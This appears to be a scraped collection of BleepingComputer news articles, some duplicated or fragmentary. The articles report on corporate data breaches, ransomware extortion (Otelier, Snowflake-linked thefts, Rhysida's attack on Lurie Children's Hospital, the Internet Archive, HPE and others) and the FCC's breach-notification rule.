"Otelier data breach exposes info, hotel reservations of millions",https://www.bleepingcomputer.com/news/security/otelier-data-breach-exposes-info-hotel-reservations-of-millions/#comment_form,Lawrence Abrams,"January 17, 2025","Hotel management platform Otelier suffered a data breach after threat actors breached its Amazon S3 cloud storage to steal millions of guests' personal information and reservations for well-known hotel brands like Marriott, Hilton, and Hyatt. The breach first allegedly occurred in July 2024, with continued access through October, with the threat actors claiming to have stolen amost eight terabytes of data from Otelier's Amazon AWS S3 buckets. In a statement to BleepingComputer, Otelier confirmed the compromise and said it is communicating with impacted customers. ""Our top priority is to safeguard our customers while enhancing the security of our systems to prevent future issues,"" Otelier told BleepingComputer. ""Otelier has been in communications with its customers whose information was potentially involved. In response to this incident, we hired a team of leading cybersecurity experts to perform a comprehensive forensic analysis and validate our systems."" ""The investigation determined that the unauthorized access was terminated. In order to help prevent a similar incident from occurring in the future, Otelier disabled the involved accounts and continues to work to enhance its cybersecurity protocols."" Otelier, previously known as MyDigitalOffice, is a cloud-based hotel management solution used by over 10,000 hotels worldwide to manage reservations, transactions, nightly reports, and invoicing. The company is or has been used by many well-known hotel brands, including Marriott, Hilton, and Hyatt, whose data is present in the stolen information. The threat actors behind the Otelier breach told BleepingComputer that they initially hacked the company's Atlassian server using an employee's login. These credentials were stolen through information-stealing malware, which has become the bane of corporate networks over the past few years. When BleepingComputer asked Otelier to confirm this information, a company representative said they could not share any further comments on the incident. However, BleepingComputer found on the Flare threat intelligence platform Otelier employee information that had been stolen by infostealer malware. The threat actors say they used these credentials to scrape tickets and other data, which contained further credentials to the company's S3 buckets. Using this access, the hackers claimed to have downloaded 7.8TB of data from the company's Amazon cloud storage, including millions of documents belonging to Marriott that were in S3 buckets managed by Otelier. These documents include nightly hotel reports, shift audits, and accounting data. Marriott has confirmed to BleepingComputer that Otelier's cyberattack has impacted them and suspended automated services while Otelier completes its investigation. The company stresses that none of its systems were breached in this attack. ""Once we were made aware of this incident involving Otelier, we immediately contacted the vendor, which works with numerous hotel companies, and confirmed that they were working with cyber security experts to investigate a security incident that impacted their systems,"" a Marriott spokesperson told BleepingComputer. ""Marriott has also taken appropriate precautions, including suspending the automated services provided by Otelier until the completion of their investigation, and those services remain suspended."" The threat actor says they attempted to extort Marriott, thinking the S3 buckets belonged to them, and left ransom notes requesting payment in cryptocurrency not to leak the data. However, no communication was made, and they said they lost access in September after credentials were rotated. While Marriott told BleepingComputer that there are no indications that sensitive information was stolen in the breach, samples of the stolen data shared with BleepingComputer and Have I Been Pwned's Troy Hunt contain hotel guests' personal information. The small samples seen by BleepingComputer include a broad range of data, including hotel guest reservations, transactions, employee emails, and other internal data. Some of the personal information exposed includes hotel guests' names, addresses, phone numbers, and email addresses. The stolen data also includes information and email addresses related to Hyatt, Hilton, and Wyndham. BleepingComputer contacted Hyatt and Hilton about the breach but did not receive a response. Troy Hunt told BleepingComputer that he received an extensive set of data, with the reservations table containing 39 million rows and a users table with 212 million. Hunt says that despite the large set, he found 1.3 million unique email addresses, as many are repeated. The exposed personal information is being added to Have I Been Pwned , allowing anyone to check if their email address is in the exposed data. Hunt removed email addresses generated by Booking.com and Expedia.com during reservations, leaving a total of 437,000 unique email addresses impacted by the breach. The good news is that passwords and billing information do not appear to have been stolen in the attack, but threat actors could still use this information in targeted phishing attacks. Therefore, you should be on the lookout for suspicious emails impersonating hotel brands impacted by this breach. Update 1/19/24: Added more information about it being added to Have I Been Pwned.

""On June 4, 2024, a criminal threat actor offered what it alleged to be Company data for sale. The Company has notified law enforcement."" After investigating the stolen files, Advance says they believe they contain personal information for current and former employees and job applicants, including social security numbers and other government identification numbers. Sample data leaked by the threat actor and seen by BleepingComputer also included employees' full names and email addresses. The data also included what is believed to be customer information, including email addresses and names. Advance says they will send data breach notifications to those impacted and offer free credit monitoring and identity restoration services as necessary.

Advance Auto Parts confirms data breach exposed employee information,https://www.bleepingcomputer.com/news/security/advance-auto-parts-confirms-data-breach-exposed-employee-information/,Lawrence Abrams,"June 19, 2024","Advance Auto Parts has confirmed it suffered a data breach after a threat actor attempted to sell stolen data on a hacking forum earlier this month. Advance operates 4,777 stores and 320 Worldpac branches and serves 1,152 independently owned Carquest stores in the United States, Canada, Puerto Rico, the U.S. Virgin Islands, Mexico, and various Caribbean islands. Earlier this month, BleepingComputer reported that a threat actor named 'Sp1d3r' began selling data they claimed was stolen during the recent Snowflake data-theft attacks . BleepingComputer contacted Advance multiple times about the alleged data breach, but they never responded to our emails. However, in an SEC filing first spotted by security researcher pancak3 , Advance Auto Parts confirmed that their data was stolen from a third-party cloud database environment. ""On May 23, 2024, Advance Auto Parts, Inc. (the ""Company"") identified unauthorized activity within a third-party cloud database environment containing Company data and launched an investigation with industry-leading experts,"" reads Form 8-K filing released on Friday. ""On June 4, 2024, a criminal threat actor offered what it alleged to be Company data for sale. The Company has notified law enforcement."" After investigating the stolen files, Advance says they believe they contain personal information for current and former employees and job applicants, including social security numbers and other government identification numbers. Sample data leaked by the threat actor and seen by BleepingComputer also included employees' full names and email addresses. The data also included what is believed to be customer information, including email addresses and names. Advance says they will send data breach notifications to those impacted and offer free credit monitoring and identity restoration services as necessary. It is unclear if this will be only for employees at this time or for exposed customers as well. The company states that they have incurred $3 million in expenses due to the incident.

Ransomware isn’t going away – the problem is only getting worse,https://www.bleepingcomputer.com/news/security/ransomware-isnt-going-away-the-problem-is-only-getting-worse/#comment_form,Home,"October 25, 2023","As the world moves steadily to becoming more and more digital, organizations worldwide become increasingly dependent on IT systems to run their services. Threat actors know this fact very well. A short time ago, cyberattacks were used to spread computer viruses to bring harm to target systems, such as making them unstable. However, as modern attack tools developed, a new devastating criminal model appeared that could both harm targeted systems, and extort money from victims by encrypting their files, and taking them hostage. The new attack model is called ransomware, and it is gaining more momentum year after year. According to a recent report by Malwarebytes , Global ransomware attacks have witnessed a boost in 2023. The report recorded 1,900 ransomware attacks against four countries—the US, Germany, France, and the UK—in one year. Ransomware attacks become costly over time too, Cyber Security Ventures predicts by 2031, a ransomware attack will occur every two seconds, costing the world around $265 billion (USD) of losses annually. Most recorded ransomware attacks target big organizations; however, this is no longer the case. Ransomware operators are more frequently targeting small and medium-sized businesses as well as individuals. For instance, with back-to-school, ransomware has risen against schools. According to the Recorded Future , at least 27 schools and districts were hit with ransomware this August (see Figure 1). The ransomware as a Service (RaaS) business model enables cybercriminals lacking technical skills to launch ransomware attacks without developing them. RaaS operators provide the ransomware payload, infrastructure, and payment systems in exchange for an affiliate fee based on successful ransoms. This allows novice attackers to launch devastating ransomware campaigns against various targets and help accelerate the spreading of ransomware attacks worldwide. Almost every day, we hear in the news about a major ransomware incident that hit a major organization; here are some recent ransomware incidents: The huge profits gained from ransomware attacks have made it a lucrative method for cybercriminals to earn money. Ransomware groups often base their ransom demands on a percentage of the victim company's annual revenue, usually around 3% . Hackers invest parts of the ransom payments to develop more robust attack tools and to invent new attack methods. Here are some ransomware attack techniques: A common method for ransomware operators to access targets IT environments is password-related attacks. For instance, credentials stuffing, password spraying, password reset abuse, phishing attacks, password guessing and exploiting default passwords are common password-based attacks leveraged by ransomware groups. The LockBit ransomware was the most deployed ransomware variant in 2022 and continues to be widespread in 2023. The LockBit operators leverage sophisticated techniques to attack their targets, mainly via password-related attacks, such as: There are numerous ways that hackers take advantage of poor password practice: To halt ransomware attacks that take advantage of end-users weak password practices, it is advisable to use Specops Password Policy , which extends the functionality of Group Policy in Active Directory and provides advanced password policy features, including: Ransomware continues to evolve as a preferred cybercriminal business model. To fight ransomware, organizations must boost their cyber defenses using a layered security model that involves enforcing strong password policies and deploying different security solutions. For instance, most ransomware attacks begin with a compromised password, so blocking the use of over 4 billion unique compromised passwords helps prevent all cyberattacks that take advantage of this attack vector.

FCC orders telecom carriers to report PII data breaches within 30 days,https://www.bleepingcomputer.com/news/security/fcc-orders-telecom-carriers-to-report-pii-data-breaches-within-30-days/#comment_form,Sergiu Gatlan,"February 12, 2024","Starting March 13th, telecommunications companies must report data breaches impacting customers' personally identifiable information within 30 days, as required by FCC's updated data breach reporting requirements. FCC's final rule follows several proposals published in January 2024 , one year earlier in January 2023 , and first circulated in January 2022, focused on modernizing the commission's breach notification rules so that telecom carriers have to notify customers of security breaches as fast as possible. The updated data breach reporting rules aim to ensure that ""providers of telecommunications, interconnected Voice over Internet Protocol (VoIP), and telecommunications relay services (TRS) are held accountable in their obligations to safeguard sensitive customer information, and to provide customers with the tools needed to protect themselves in the event that their data is compromised."" They expand the scope of breach notification requirements beyond customer proprietary network information ( CPNI ) to personally identifiable information ( PII ), as well as to include ""inadvertent access, use, or disclosure of customer information."" ""Without an FCC rule requiring breach notifications for the above categories of PII, there would be no requirement in Federal law that telecommunications carriers report non-CPNI breaches to their customers,"" the FCC said . The U.S. communications regulator also removed the obligatory waiting period for carriers to inform customers, mandating them to promptly notify customers of breaches involving covered data after alerting relevant federal agencies. However, the notification delay must not exceed 30 days after a breach is identified unless a longer delay is mandated by law enforcement. ""Our mobile phones are in our palms, pockets, and purses. We rarely go anywhere without them. There is good reason for this—the convenience and safety of being able to reach out anytime and virtually anywhere is powerful,"" said FCC Chairwoman Jessica Rosenworcel in January. ""But this always-on connectivity means that our carriers have access to a treasure trove of data about who we are, where we have traveled, and who we have talked to. It is vitally important that this deeply personal data does not fall into the wrong hands."" Massive telecom data breaches in recent years have highlighted the need to update the FCC's data breach rules to align them with federal and state data breach laws that apply to other sectors. For example, in December 2022, widespread attacks bypassed two-factor authentication and hijacked Comcast Xfinity customers' accounts. Two months earlier, Verizon notified prepaid customers of a breach that exposed their credit card information, later used in SIM swapping attacks. T-Mobile has also been hit by at least nine breaches since 2018, with the most recent one—and the least damaging—being disclosed in May 2023 after threat actors had access to the personal information of hundreds of customers for more than a month since February 2023. In January 2023, T-Mobile alerted customers of another data breach after the sensitive info of 37 million individuals was stolen by abusing one of its Application Programming Interfaces (APIs). Finally, in April 2016, AT&T paid $25 million to settle an FCC investigation into three data breaches that impacted hundreds of thousands of customers.

Cylance confirms data breach linked to 'third-party' platform,https://www.bleepingcomputer.com/news/security/cylance-confirms-data-breach-linked-to-third-party-platform/#comment_form,Sergiu Gatlan,"June 10, 2024","Cybersecurity company Cylance confirmed the legitimacy of data being sold on a hacking forum, stating that it is old data stolen from a ""third-party platform."" A threat actor known as Sp1d3r is selling this stolen data for $750,000, as first spotted by Dark Web Informer . The data allegedly includes a substantial amount of information, such as 34,000,000 customer and employee emails and personally identifiable information belonging to Cylance customers, partners, and employees. However, researchers have told BleepingComputer that the leaked samples appear to be old marketing data used by Cylance. BlackBerry Cylance told BleepingComputer that they're aware of and investigating the threat actor's claims but that no ""BlackBerry data and systems related to [..] customers, products, and operations have been compromised."" ""Based on our initial reviews of the data in question, no current Cylance customers are impacted, and no sensitive information is involved,"" the company added. ""The data in question was accessed from a third-party platform unrelated to BlackBerry and appears to be from 2015-2018, predating BlackBerry's acquisition of the Cylance product portfolio."" While the company has yet to reply to a follow-up request for more details regarding the name of the third-party platform that was breached to steal what it claims to be old data, the same threat actor is also selling 3TB of data from automotive aftermarket parts provider Advance Auto Parts , stolen after breaching the company's Snowflake account. BleepingComputer found a link to a Snowflake web management console located at https://cylance.snowflakecomputing.com/ that appears to be linked to Cylance. However, a BlackBerry spokesperson told BleepingComputer that the dashboard is ""old and invalid"" and ""BlackBerry Cylance is not a Snowflake customer."" Recent breaches at Santander , Ticketmaster , and QuoteWizard/Lendingtree have also been linked to Snowflake attacks. Ticketmaster's parent company, Live Nation, also confirmed that a data breach had affected the ticketing firm after its Snowflake account was compromised on May 20. In a joint advisory with CrowdStrike and Mandiant, Snowflake said that attackers had used stolen customer credentials to target accounts without multi-factor authentication protection. Today, Mandiant published a report linking the Snowflake attacks to a financially motivated threat actor it tracks as UNC5537. The actor gained access to Snowflake customer accounts using customer credentials stolen in infostealer malware infections from as far back as 2020. Mandiant has been tracking the UNC5537 since May 2024. The financially motivated threat actor has targeted hundreds of organizations worldwide, extorting victims for financial gain. While Mandiant has not shared much information about UNC5537, BleepingComputer has learned they are part of a larger community of threat actors who frequent the same websites, Telegram, and Discord servers, where they commonly collaborate on attacks.​ ""The impacted accounts were not configured with multi-factor authentication enabled, meaning successful authentication only required a valid username and password,"" Mandiant said. ""Credentials identified in infostealer malware output were still valid, in some cases years after they were stolen, and had not been rotated or updated. The impacted Snowflake customer instances did not have network allow lists in place to only allow access from trusted locations."" Mandiant says it has identified hundreds of customer Snowflake credentials exposed in Vidar, RisePro, Redline, Racoon Stealer, Lumm, and Metastealer infostealer malware attacks since at least 2020. To date, Snowflake and Mandiant have notified around 165 organizations potentially exposed to these ongoing attacks.

CannonDesign confirms Avos Locker ransomware data breach,https://www.bleepingcomputer.com/news/security/cannondesign-confirms-avos-locker-ransomware-data-breach/#comment_form,Bill Toulas,"August 20, 2024","The Cannon Corporation dba CannonDesign is sending notices of a data breach to more than 13,000 of current and former employees, informing that hackers breached and stole data from its network in an attack in early 2023. CannonDesign is a multi-awarded architectural, engineering, and consulting firm based in the United States, recognized for its work on high-profile projects such as academic buildings, hospitals, and sports arenas. The company, ranked one of the most innovative architecture firms in the world, has been involved in major projects like the University of Minnesota Health Clinics and Surgery Center, and the multi-purpose stadium at the University of Maryland. The notification letter that CannonDesign started sending to impacted individuals informs of a security incident that occurred between January 19-25, 2023, which involved unauthorized network access and data exfiltration. Although the firm discovered the intrusion on January 25, 2023, the investigation into the incident was only completed on May 3, 2024, and it took them another three months. The investigation revealed that the threat actor behind the attack might have accessed names, addresses, social security numbers (SSNs), and driver’s license numbers. Notification recipients are offered 24-month credit monitoring through Experian to mitigate the risk that stems from their personal data exposure, though it should be noted that this comes with a significant delay. Even though Cannon Design has not named the cybercriminals responsible for the attack, a spokesperson confirmed to BleepingComputer that the disclosure relates to the Avos Locker ransomware attack that occured early in 2023. Also, the firm states that it is not aware of any attempted misuse of the stolen information, although the data has been published online multiple times and on various sites. On February 2, 2023, the Avos Locker ransomware gang announced a breach on CannonDesign, claiming to hold 5.7 TB of stolen data, including corporate and client files. After the threat actor’s presumably failed to extort the architectural firm, the baton was passed to Dunghill Leaks, which published 2TB of data stolen from CannonDesign on September 26, 2023. The data allegedly included database dumps, project schematics, hiring documents, client details, marketing material, IT and infrastructure details, and quality assurance reports. Dunghill Leaks is a data leak site launched by the Dark Angels ransomware group in April 2023 and used to pressure victims into paying the ransomware demand. In February 2024, the same dataset was published on hacker forums in the dark web, including ClubHydra, while one part of the dataset was shared via torrent on Breached Forums in July 2024.

PSNI disclosed the incident on August 8, 2023 , when the police force warned that a mistake occurred during a response to a Freedom of Information (FOI) Request, exposing the following data about 9,483 active officers and staff: According to the ICO's assessment, the incident put exposed individuals at grave physical risk, resulted from poor data security from PSNI, and was deemed entirely preventable.

Rhysida ransomware wants $3.6 million for children’s stolen data,https://www.bleepingcomputer.com/news/security/rhysida-ransomware-wants-36-million-for-childrens-stolen-data/#comment_form,Bill Toulas,"February 28, 2024","The Rhysida ransomware gang has claimed the cyberattack on Lurie Children's Hospital in Chicago at the start of the month. Lurie is a leading pediatric acute care institution in the U.S. that provides care to over 200,000 children annually. The cyberattack forced the healthcare provider to take its IT systems offline and postpone medical care in some cases. Email, phone, access to MyChart, and on-premises internet were all impacted. Ultrasound and CT scan results were rendered unavailable, patient service prioritization systems were taken down, and doctors were forced to switch to pen and paper for prescriptions. Today, the Rhysida ransomware gang has listed Lurie Children's on its extortion portal on the dark web, claiming to have stolen 600 GB of data from the hospital. Rhysida ransomware now offers to sell the stolen data for 60 BTC ($3,700,000) to a single buyer. The deadline was set to seven days, after which the data will either be sold to multiple threat actors at a lower price or leaked for free on Rhysida's platform. As per the latest status update from Lurie Children's on February 22, 2024, effort to restore the IT system is ongoing, and service disruptions still impact some operational segments. Parents are advised to bring a print of their insurance card to their appointments along with their children's medication bottles, as the health records system that logs this data is apparently still offline. MyChart remains unavailable, and wait times are longer than usual as prescription preparation is still done by hand. Some procedures and appointments may be canceled and rescheduled as things are moved around to accommodate urgent care cases. As the payment systems are also impacted, the timeframe for covering medical bills has been extended for as long as the outage lasts. Also, the hospital currently does not charge no-show fees for appointments. The Rhysida ransomware gang has had a misstep recently when Korean researchers published the full details of a flaw in their encryptor which could be leveraged for decrypting files without paying a ransom. Judging from the lengthy disruption at Lurie Children's, the decryptor that law enforcement used for many months privately may not work in the threat group's most recent attacks. Furthermore, should Rhysida's claims of data exfiltration prove accurate, it means that the sensitive medical information of a large number of children has been irreversibly compromised by cybercriminals.

Rhysida ransomware wants $3.6 million for children’s stolen data,https://www.bleepingcomputer.com/news/security/rhysida-ransomware-wants-36-million-for-childrens-stolen-data/,Bill Toulas,"February 28, 2024","The Rhysida ransomware gang has claimed the cyberattack on Lurie Children's Hospital in Chicago at the start of the month. Lurie is a leading pediatric acute care institution in the U.S. that provides care to over 200,000 children annually. The cyberattack forced the healthcare provider to take its IT systems offline and postpone medical care in some cases. Email, phone, access to MyChart, and on-premises internet were all impacted. Ultrasound and CT scan results were rendered unavailable, patient service prioritization systems were taken down, and doctors were forced to switch to pen and paper for prescriptions. Today, the Rhysida ransomware gang has listed Lurie Children's on its extortion portal on the dark web, claiming to have stolen 600 GB of data from the hospital. Rhysida ransomware now offers to sell the stolen data for 60 BTC ($3,700,000) to a single buyer. The deadline was set to seven days, after which the data will either be sold to multiple threat actors at a lower price or leaked for free on Rhysida's platform. As per the latest status update from Lurie Children's on February 22, 2024, effort to restore the IT system is ongoing, and service disruptions still impact some operational segments. Parents are advised to bring a print of their insurance card to their appointments along with their children's medication bottles, as the health records system that logs this data is apparently still offline. MyChart remains unavailable, and wait times are longer than usual as prescription preparation is still done by hand. Some procedures and appointments may be canceled and rescheduled as things are moved around to accommodate urgent care cases. As the payment systems are also impacted, the timeframe for covering medical bills has been extended for as long as the outage lasts. Also, the hospital currently does not charge no-show fees for appointments. The Rhysida ransomware gang has had a misstep recently when Korean researchers published the full details of a flaw in their encryptor which could be leveraged for decrypting files without paying a ransom. Judging from the lengthy disruption at Lurie Children's, the decryptor that law enforcement used for many months privately may not work in the threat group's most recent attacks. Furthermore, should Rhysida's claims of data exfiltration prove accurate, it means that the sensitive medical information of a large number of children has been irreversibly compromised by cybercriminals.

DCBOE operates as an autonomous agency within the District of Columbia Government and is entrusted with overseeing elections, managing ballot access, and handling voter registration processes. Its investigation into the claims has revealed that the attackers accessed the information through the web server of DataNet Systems, the hosting provider for Washington D.C.'s election authority. Notably, the breach did not involve a direct compromise of DCBOE's servers and internal systems. ""On 10/5, DCBOE became aware of cybersecurity incident involving DC voter records. While the incident remains under investigation, DCBOE's internal databases & servers were not compromised,"" the agency said. In close cooperation with MS-ISAC's Computer Incident Response Team (CIRT), DCBOE took down its website and replaced it with a maintenance page to contain the situation after identifying it as the source of the breach. Since the discovery of the incident, the election board worked with data security experts, the Federal Bureau of Investigation (FBI), and the Department of Homeland Security (DHS) to conduct a comprehensive security assessment of its internal systems. Additionally, DCBOE initiated vulnerability scans across its database, server, and IT networks to identify potential security issues that might have facilitated the attackers' access to the stolen information. RansomedVC alleges that the recent incident resulted in the theft of over 600,000 lines of U.S. voter data, encompassing records of D.C. voters. ""We have successfully breached the District of Columbia Board Of Elections and have gotten more than 600k lines of USA Voters,"" the threat actor says. The stolen information is currently being offered for sale on the threat actor's dark web leak site, but the exact price is undisclosed. As verification of the data's authenticity, RansomedVC has provided a single record containing what it claims to be the personal details of a Washington D.C. voter. This dataset includes the individual's name, registration ID, voter ID, partial Social Security number, driver's license number, date of birth, phone number, email, and more. ""It should be noted that in the District of Columbia, some voter registration data-such as voter names, addresses, voting records, and party affiliation-is public information, unless it has been made confidential in accordance with District of Columbia rules and regulations,"" the Washington election authority said in its statement. However, election authorities do not provide access to confidential information such as voters' contact information and SSNs. RansomedVC told DataBreaches.net , who first reported the data leak on Thursday, that the stolen voter records would be sold to a single buyer. While RansomedVC has claimed the breach and is now selling the data on their leak site, an anonymous source told BleepingComputer on October 3rd that DCBOE's stolen database was first put up for sale on the BreachForums and Sinister.ly hacking forums by a user named pwncoder (those posts have since been deleted). As BleepingComputer was told, the data was dumped from a stolen MSSQL database and contained the information of more than 600,000 D.C. voters. Recent claims made by RansomedVC to have breached Sony's systems and stolen over 260GB of files (with a 2MB leaked archive as evidence) were disputed by another threat actor who identifies as MajorNelson.

Johnson Controls is a multinational conglomerate that develops and manufactures industrial control systems, security equipment, air conditioners, and fire safety equipment. As first reported by BleepingComputer, Johnson Controls suffered a ransomware attack in September after the firm's Asia offices were initially breached, and the attackers spread throughout their network. The attack forced the firm to shut down large portions of its IT infrastructure, which affected customer-facing systems. The Dark Angels ransomware gang was behind the attack and claimed to have stolen over 27 TB of confidential data from Johnson Controls. The threat actors then demanded a $51 million ransom to delete the data and provide a file decryptor. Dark Angels is a ransomware gang launched in May 2022 using encryptors based on the leaked source code of the now-defunct Babuk and Ragnar Locker operations. The company acknowledged a service disruption and later attributed the cause to a ""cybersecurity incident"" but didn't provide details on the type of the attack or the possibility of it having caused a data breach. In a quarterly report filed with the U.S. Securities and Exchange Commission (SEC) yesterday, Johnson Controls confirmed that the cyberattack they suffered on September 23, 2023, was, in fact, a ransomware attack that resulted in the theft of data. ""The cybersecurity incident consisted of unauthorized access, data exfiltration, and deployment of ransomware by a third party to a portion of the Company's internal IT infrastructure,"" confirmed Johnson Controls.

Internet Archive's ""The Wayback Machine"" has suffered a data breach after a threat actor compromised the website and stole a user authentication database containing 31 million unique records. News of the breach began circulating Wednesday afternoon after visitors to archive.org began seeing a JavaScript alert created by the hacker, stating that the Internet Archive was breached. ""Have you ever felt like the Internet Archive runs on sticks and is constantly on the verge of suffering a catastrophic security breach? It just happened. See 31 million of you on HIBP!,"" reads a JavaScript alert shown on the compromised archive.org site. The text ""HIBP"" refers to the Have I Been Pwned data breach notification service created by Troy Hunt, with whom threat actors commonly share stolen data to be added to the service. Hunt told BleepingComputer that the threat actor shared the Internet Archive's authentication database nine days ago and it is a 6.4GB SQL file named ""ia_users.sql."" The database contains authentication information for registered members, including their email addresses, screen names, password change timestamps, Bcrypt-hashed passwords, and other internal data. The most recent timestamp on the stolen records is September 28th, 2024, likely when the database was stolen. Hunt says there are 31 million unique email addresses in the database, with many subscribed to the HIBP data breach notification service. The data will soon be added to HIBP, allowing users to enter their email and confirm if their data was exposed in this breach. The data was confirmed to be real after Hunt contacted users listed in the databases, including cybersecurity researcher Scott Helme , who permitted BleepingComputer to share his exposed record. Helme confirmed that the bcrypt-hashed password in the data record matched the brcrypt-hashed password stored in his password manager. He also confirmed that the timestamp in the database record matched the date when he last changed the password in his password manager. Hunt says he contacted the Internet Archive three days ago and began a disclosure process, stating that the data would be loaded into the service in 72 hours, but he has not heard back since. It is not known how the threat actors breached the Internet Archive and if any other data was stolen. Earlier today, the Internet Archive suffered a DDoS attack, which has now been claimed by the BlackMeta hacktivist group, who says they will be conducting additional attacks. BleepingComputer contacted the Internet Archive with questions about the attack, but no response was immediately available. Update 10/10/24: Internet Archive founder Brewster Kahle shared an update on X last night, confirming the data breach and stating that the threat actor used a JavaScript library to show the alerts to visitors. ""What we know: DDOS attacked-fended off for now; defacement of our website via JS library; breach of usernames/email/salted-encrypted passwords,"" reads a first status update tweeted last night. ""What we've done: Disabled the JS library, scrubbing systems, upgrading security."" A second update shared this morning states that DDoS attacks have resumed, taking archive.org and openlibrary.org offline again. While the Internet Archive is facing both a data breach and DDoS attacks at the same, it is not believed that the two attacks are connected. Update 10/20/24: The Internet Archive was breached again, this time with the threat actors gaining access to their Zendesk support email system.

The Japanese tech giant says the threat actors tried to extort the company and decided to leak the information after their demands were not met. The attack did not encrypt files and the incident is considered fully remediated at this time. However, Nidec employees, contractors, and associates, should be aware that the leaked data could be used in more targeted phishing attacks. Nidec Corporation is a global leader in the manufacturing of precision motors, automotive components, industrial parts, home appliance parts, and robotic systems. It operates in 40 countries, employs 120,000 people, and generates an annual revenue of more than $11 billion. The cyberattack breached Nidec Precision division based in Vietnam, which specializes in manufacturing optical, electronic, and mechanical equipment for the photography industry. As per the results of the internal investigation , which is still ongoing, the hackers obtained valid VPN account credentials of a Nidec employee and accessed a server that contained confidential information. The company closed the entry point and implemented additional security measures, as per recommendations from external cybersecurity experts. Nidec employees are undergoing training on how to minimize such risks. The investigation also revealed that the attackers stole 50,694 files, including the following: Nidec said that it would notify directly its business partners affected by the incident. The 8BASE ransomware gang claimed an attack on Nidec on June 18, alleging that the data had been stolen from the systems of the Japanese firm on June 3, 2024. 8BASE claimed to be holding much of what Nidec confirmed via its investigation, plus personal data and “a huge mount of confidential information.” Nidec in July aknowledged a ransomware attack without naming the perpetrators, stating that it was the impacted division was Nidec Instruments. On August 8, the Everest ransomware group, known for receiving stolen data from other cybercriminals to perform new extortion attempts on victims, published data allegedly stolen from Nidec. The company states in the latest announcement that the threat actors first made contact on August 5, suggesting that the communication came from the Everest ransomware gang. Nidec has acknowledged that the data that leaked on the dark web comes from its systems but did not offer any clarification about the threat actors' claims.

The company has told BleepingComputer that they have not found any evidence of a security breach and no ransom has been requested, but it's investigating the threat actor's claims. ""We are aware of the claims and are investigating their veracity,"" HPE's Sr. Director for Global Communications Adam R. Bauer told BleepingComputer on Thursday. ""At this time we have not found evidence of an intrusion, nor any impact to HPE products or services. There has not been an extortion attempt."" When asked to provide additional details regarding the company's ongoing investigation, Bauer said they had ""nothing new to share."" IntelBroker, the threat actor selling the alleged HPE data, shared screenshots of some of the supposedly stolen HPE credentials but has yet to disclose the source of the information or the method used to obtain it. ""Today, I am selling the data I have taken from Hewlett Packard Enterprise,"" the threat actor says in a post on the hacking forum. ""More specifically, the data includes: CI/CD access , System logs , Config Files , Access Tokens , HPE StoreOnce Files (Serial numbers warrant etc) & Access passwords. (Email services are also included)."" IntelBroker is best known for the breach of DC Health Link , which led to a congressional hearing after it exposed the personal data of U.S. House of Representatives members and staff. Other cybersecurity incidents linked to IntelBroker are the breach of the Weee! grocery service and an alleged breach of General Electric Aviation . ​This investigation comes after HPE disclosed two weeks ago that the company's Microsoft Office 365 email environment was breached in May 2023 by hackers the company believed to be part of the Russian APT29 hacking group linked to Russia's Foreign Intelligence Service (SVR). The company said the Russian hackers stole SharePoint files and data from its cybersecurity team and other departments and maintained access to its cloud infrastructure until December when HPE was again alerted of a breach of its cloud-based email environment. ""On December 12, 2023, HPE was notified that a suspected nation-state actor had gained unauthorized access to the company's Office 365 email environment. HPE immediately activated cyber response protocols to begin an investigation, remediate the incident, and eradicate the activity,"" HPE told BleepingComputer. ""Through that investigation, which remains ongoing, we determined that this nation-state actor accessed and exfiltrated data beginning in May 2023 from a small percentage of HPE mailboxes belonging to individuals in our cybersecurity, go-to-market, business segments, and other functions."" Days before HPE's Russian hack disclosure, Microsoft revealed a similar breach where APT29 breached some of its corporate email accounts belonging to its leadership team and employees in the cybersecurity and legal departments. Microsoft later shared that the threat actors gained access to the corporate email accounts after hacking into a misconfigured test tenant account by brute forcing its password in a ""password spraying"" attack. HPE was also breached in 2018 when APT10 Chinese hackers also hacked into IBM's networks and used the access to hack into their customers' devices. More recently, HPE disclosed in 2021 that data repositories of its Aruba Central network monitoring platform were compromised , enabling attackers to access data about monitored devices and their locations. Update February 05, 16:46 EST: After the article was published, Bauer also told BleepingComputer that the data being offered for sale online was obtained from a ""test environment."" ""Based on our investigation so far, the data at issue appears to be related to information that was contained in a test environment. There is no indication these claims relate to any compromise of HPE production environments or customer information,"" Bauer said in a statement sent over email. ""These are local credentials used in an isolated test environment and are not applicable to the production environment. In addition, these credentials alone would not allow access to production environments as we have multi-layered security measures in place. Furthermore, we don’t have any indication that these claims relate to any compromise of customer information. That said, we have taken additional measures to harden our environment further in relation to the credentials at issue."" It's budget season!

Other cybersecurity incidents linked to IntelBroker are the breach of the Weee! grocery service and an alleged breach of General Electric Aviation . ​This investigation comes after HPE disclosed two weeks ago that the company's Microsoft Office 365 email environment was breached in May 2023 by hackers the company believed to be part of the Russian APT29 hacking group linked to Russia's Foreign Intelligence Service (SVR). The company said the Russian hackers stole SharePoint files and data from its cybersecurity team and other departments and maintained access to its cloud infrastructure until December when HPE was again alerted of a breach of its cloud-based email environment. ""On December 12, 2023, HPE was notified that a suspected nation-state actor had gained unauthorized access to the company's Office 365 email environment. HPE immediately activated cyber response protocols to begin an investigation, remediate the incident, and eradicate the activity,"" HPE told BleepingComputer. ""Through that investigation, which remains ongoing, we determined that this nation-state actor accessed and exfiltrated data beginning in May 2023 from a small percentage of HPE mailboxes belonging to individuals in our cybersecurity, go-to-market, business segments, and other functions."" Days before HPE's Russian hack disclosure, Microsoft revealed a similar breach where APT29 breached some of its corporate email accounts belonging to its leadership team and employees in the cybersecurity and legal departments. Microsoft later shared that the threat actors gained access to the corporate email accounts after hacking into a misconfigured test tenant account by brute forcing its password in a ""password spraying"" attack. HPE was also breached in 2018 when APT10 Chinese hackers also hacked into IBM's networks and used the access to hack into their customers' devices. More recently, HPE disclosed in 2021 that data repositories of its Aruba Central network monitoring platform were compromised , enabling attackers to access data about monitored devices and their locations. Update February 05, 16:46 EST: After the article was published, Bauer also told BleepingComputer that the data being offered for sale online was obtained from a ""test environment."" ""Based on our investigation so far, the data at issue appears to be related to information that was contained in a test environment. There is no indication these claims relate to any compromise of HPE production environments or customer information,"" Bauer said in a statement sent over email. ""These are local credentials used in an isolated test environment and are not applicable to the production environment. In addition, these credentials alone would not allow access to production environments as we have multi-layered security measures in place. Furthermore, we don’t have any indication that these claims relate to any compromise of customer information. That said, we have taken additional measures to harden our environment further in relation to the credentials at issue.""

